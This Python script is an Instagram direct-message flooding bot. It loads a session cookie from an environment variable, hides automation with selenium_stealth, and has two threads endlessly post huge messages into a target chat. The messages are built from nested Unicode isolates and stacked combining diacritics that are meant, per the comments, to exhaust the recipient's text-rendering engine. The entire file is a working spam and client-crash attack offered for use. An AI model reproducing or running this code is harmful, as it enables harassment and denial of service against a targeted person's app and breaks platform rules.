# -*- coding: utf-8 -*-
# 🚀 PROJECT: PRAVEER.OWNS (RECURSIVE-NUCLEAR V66)
# 📅 STATUS: HARFBUZZ-STACK-OVERFLOW | 4-AGENT TOTAL | AWS-CPU-KILL

import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from selenium_stealth import stealth
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options

# --- 4 AGENTS TOTAL CONFIG ---
AGENTS_PER_MACHINE = 2             
TOTAL_DURATION = 25000 
BURST_SPEED = (0.1, 0.4)    # 🔥 High-Frequency Injection
REST_AFTER_STRIKES = 150   
REST_DURATION = 3          

GLOBAL_SENT = 0
COUNTER_LOCK = threading.Lock()
BROWSER_LAUNCH_LOCK = threading.Lock()

def get_recursive_nuclear_payload():
    """Generates a payload that targets the recursive limits of the layout engine."""
    u_id = random.randint(100, 999)
    
    # \u2066 = LRI | \u2067 = RLI | \u2069 = PDI (Isolates)
    # \u0300-\u036F = Combining Marks (Diacritics)
    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
    marks = "".join([chr(i) for i in range(0x0300, 0x0340)]) # 64 stacked marks
    glue = "\u2060" # Word Joiner
    
    header = f"👑 PRAVEER PAPA ON TOP 🌙 [FINAL_LOCK:{u_id}]"
    
    body = []
    # 400 lines of 'Recursive Stack Thrashing'
    for i in range(400):
        # We nest isolates 5 levels deep per line.
        # This forces the browser to open 5 new 'Rendering Contexts' for every word.
        # Then we stack 64 diacritics on the characters.
        nest = f"{lri}{rli}{lri}{rli}{lri}P{marks}R{marks}A{marks}V{marks}EER{pdi*5}"
        line = f"{nest} PAPA ON TOP 🌙 {i}{glue*8}"
        body.append(line)
        
    return f"{header}\n{glue.join(body)}".strip()[:9998]

def get_driver(agent_id):
    with BROWSER_LAUNCH_LOCK:
        chrome_options = Options()
        chrome_options.add_argument("--headless=new") 
        chrome_options.add_argument("--no-sandbox") 
        chrome_options.add_argument("--disable-dev-shm-usage")
        chrome_options.add_argument("--disable-gpu")
        chrome_options.binary_location = "/usr/bin/google-chrome"
        
        ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"
        chrome_options.add_argument(f"user-agent={ua}")
        
        driver = webdriver.Chrome(options=chrome_options)
        stealth(driver, languages=["en-US"], vendor="Google Inc.", platform="Win32", fix_hairline=True)
        return driver

def atomic_dispatch_send(driver, text):
    """Zero-latency DOM injection with hardware-event spoofing."""
    try:
        driver.execute_script("""
            var box = document.querySelector('div[role="textbox"], textarea');
            if (box) {
                box.focus();
                document.execCommand('selectAll', false, null);
                document.execCommand('delete', false, null);
                document.execCommand('insertText', false, arguments[0]);
                box.dispatchEvent(new Event('input', { bubbles: true }));
                var e = new KeyboardEvent('keydown', {
                    key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                    bubbles: true, cancelable: true
                });
                box.dispatchEvent(e);
            }
        """, text)
        return True
    except: return False

def run_life_cycle(agent_id, cookie, target):
    while True:
        try:
            driver = get_driver(agent_id)
            driver.get("https://www.instagram.com/")
            driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
            driver.get(f"https://www.instagram.com/direct/t/{target}/")
            time.sleep(15) 
            
            strike_count = 0
            while True:
                payload = get_recursive_nuclear_payload()
                if atomic_dispatch_send(driver, payload):
                    strike_count += 1
                    with COUNTER_LOCK:
                        global GLOBAL_SENT
                        GLOBAL_SENT += 1
                    print(f"Agent {agent_id}: Final-Nuclear-Strike ({GLOBAL_SENT})")
                    
                    if strike_count % 50 == 0:
                        driver.refresh()
                        time.sleep(10)
                time.sleep(random.uniform(*BURST_SPEED))
        except: pass
        finally:
            try: driver.quit()
            except: pass
            time.sleep(5)

def main():
    cookie = os.environ.get("INSTA_COOKIE", "").strip()
    target = os.environ.get("TARGET_THREAD_ID", "").strip()
    with ThreadPoolExecutor(max_workers=AGENTS_PER_MACHINE) as executor:
        for i in range(AGENTS_PER_MACHINE):
            executor.submit(run_life_cycle, i+1, cookie, target)

if __name__ == "__main__":
    main()
